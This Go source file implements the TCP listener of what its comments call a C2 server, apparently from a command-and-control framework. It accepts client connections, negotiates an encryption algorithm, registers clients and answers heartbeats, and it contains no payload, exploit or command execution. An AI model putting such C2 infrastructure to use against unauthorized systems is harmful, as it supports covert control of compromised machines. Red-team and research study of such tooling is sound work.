package listener

import (
	"fmt"
	"net"
	"time"

	"github.com/Cl0udRs4/dinov2/pkg/client"
	"github.com/Cl0udRs4/dinov2/pkg/crypto"
	"github.com/Cl0udRs4/dinov2/pkg/protocol"
)

// TCPListener implements a TCP listener for the C2 server
type TCPListener struct {
	config        map[string]interface{}
	address       string
	listener      net.Listener
	clientManager interface{}
	isRunning     bool
}

// NewTCPListener creates a new TCP listener
func NewTCPListener(config map[string]interface{}) (*TCPListener, error) {
	// Extract address from config
	address, ok := config["address"].(string)
	if !ok || address == "" {
		return nil, fmt.Errorf("invalid configuration: listener address is required")
	}

	return &TCPListener{
		config:    config,
		address:   address,
		isRunning: false,
	}, nil
}

// SetClientManager sets the client manager for the listener
func (l *TCPListener) SetClientManager(cm interface{}) {
	l.clientManager = cm
}

// Start starts the TCP listener
func (l *TCPListener) Start() error {
	if l.isRunning {
		return fmt.Errorf("listener is already running")
	}

	// Create TCP listener
	listener, err := net.Listen("tcp", l.address)
	if err != nil {
		return fmt.Errorf("failed to create TCP listener: %w", err)
	}

	l.listener = listener
	l.isRunning = true

	fmt.Printf("TCP listener started on %s\n", l.address)

	// Start accepting connections
	go l.acceptConnections()

	return nil
}

// Stop stops the TCP listener
func (l *TCPListener) Stop() error {
	if !l.isRunning {
		return nil
	}

	// Close listener
	if l.listener != nil {
		err := l.listener.Close()
		if err != nil {
			return fmt.Errorf("failed to close TCP listener: %w", err)
		}
	}

	l.isRunning = false
	fmt.Printf("TCP listener stopped\n")

	return nil
}

// acceptConnections accepts incoming TCP connections
func (l *TCPListener) acceptConnections() {
	for l.isRunning {
		// Accept connection
		conn, err := l.listener.Accept()
		if err != nil {
			if l.isRunning {
				fmt.Printf("Failed to accept connection: %v\n", err)
			}
			continue
		}

		// Handle connection in a new goroutine
		go l.handleConnection(conn)
	}
}

// handleConnection handles a TCP connection
func (l *TCPListener) handleConnection(conn net.Conn) {
	defer conn.Close()

	fmt.Printf("New connection from %s\n", conn.RemoteAddr())

	// Set read deadline to prevent hanging connections
	conn.SetReadDeadline(time.Now().Add(10 * time.Second))

	// Read initial packet
	buffer := make([]byte, 1024)
	n, err := conn.Read(buffer)
	if err != nil {
		fmt.Printf("Failed to read from connection: %v\n", err)
		return
	}

	// Reset read deadline
	conn.SetReadDeadline(time.Time{})

	// Decode packet
	packet, err := protocol.DecodePacket(buffer[:n])
	if err != nil {
		fmt.Printf("Failed to decode packet: %v\n", err)
		return
	}

	// Create a simple protocol handler for this connection
	protocolHandler := protocol.NewProtocolHandler()
	
	// Generate a unique session ID
	sessionID := crypto.GenerateSessionID()
	
	// Create a session with AES encryption (default, will be updated based on client handshake)
	err = protocolHandler.CreateSession(sessionID, crypto.AlgorithmAES)
	if err != nil {
		fmt.Printf("Failed to create session: %v\n", err)
		return
	}

	// Get encryption algorithm from packet
	var algorithm crypto.Algorithm
	if packet.Header.Type == protocol.PacketTypeHandshake {
		// Extract algorithm from handshake data
		if len(packet.Data) > 0 {
			algorithm = crypto.Algorithm(packet.Data)
		} else {
			algorithm = crypto.AlgorithmAES // Default to AES
		}
	} else {
		algorithm = crypto.AlgorithmAES // Default to AES
	}

	// Update session with the correct encryption algorithm
	err = protocolHandler.UpdateSessionAlgorithm(sessionID, algorithm)
	if err != nil {
		fmt.Printf("Failed to update session algorithm: %v\n", err)
		return
	}

	// Create client configuration
	clientConfig := &client.ClientConfig{
		ServerAddress:  conn.RemoteAddr().String(),
		Protocols:      []client.ProtocolType{client.ProtocolTypeTCP},
		EncryptionAlg:  string(algorithm),
		HeartbeatInterval: 30 * time.Second,
	}

	// Create new client
	newClient, err := client.NewClient(clientConfig)
	if err != nil {
		fmt.Printf("Failed to create client: %v\n", err)
		return
	}

	// Register client with client manager if available
	if l.clientManager != nil {
		fmt.Printf("DEBUG: Client manager type: %T\n", l.clientManager)
		
		// Type assertion to check if client manager implements RegisterClient
		if cm, ok := l.clientManager.(*client.Manager); ok {
			// Register client
			clientID := cm.RegisterClient(newClient)
			fmt.Printf("Registered client with ID %s\n", clientID)
		} else {
			fmt.Printf("Client manager does not implement RegisterClient method\n")
		}
	} else {
		fmt.Printf("No client manager available\n")
	}

	// Send handshake response
	response := protocol.NewPacket(protocol.PacketTypeHandshakeResponse, []byte(algorithm))
	encodedResponse, err := protocol.EncodePacket(response)
	if err != nil {
		fmt.Printf("Failed to encode response: %v\n", err)
		return
	}

	_, err = conn.Write(encodedResponse)
	if err != nil {
		fmt.Printf("Failed to send response: %v\n", err)
		return
	}

	fmt.Printf("Handshake completed with %s using %s encryption\n", conn.RemoteAddr(), algorithm)

	// Handle client communication
	l.handleClientCommunication(conn, protocolHandler, sessionID, newClient)
}

// handleClientCommunication handles communication with a client
func (l *TCPListener) handleClientCommunication(conn net.Conn, protocolHandler *protocol.ProtocolHandler, sessionID crypto.SessionID, client *client.Client) {
	buffer := make([]byte, 1024)

	for {
		// Read packet
		n, err := conn.Read(buffer)
		if err != nil {
			fmt.Printf("Connection closed: %v\n", err)
			break
		}

		// Decode packet
		packet, err := protocol.DecodePacket(buffer[:n])
		if err != nil {
			fmt.Printf("Failed to decode packet: %v\n", err)
			continue
		}

		// Process packet based on type
		switch packet.Header.Type {
		case protocol.PacketTypeHeartbeat:
			// Respond to heartbeat
			response := protocol.NewPacket(protocol.PacketTypeHeartbeat, nil)
			encodedResponse, err := protocol.EncodePacket(response)
			if err != nil {
				fmt.Printf("Failed to encode heartbeat response: %v\n", err)
				continue
			}

			_, err = conn.Write(encodedResponse)
			if err != nil {
				fmt.Printf("Failed to send heartbeat response: %v\n", err)
				continue
			}

			fmt.Printf("Heartbeat received from %s\n", conn.RemoteAddr())

		case protocol.PacketTypeDisconnect:
			// Client is disconnecting
			fmt.Printf("Client %s is disconnecting\n", conn.RemoteAddr())
			return

		default:
			// Handle other packet types
			fmt.Printf("Received packet type %d from %s\n", packet.Header.Type, conn.RemoteAddr())
		}
	}
}
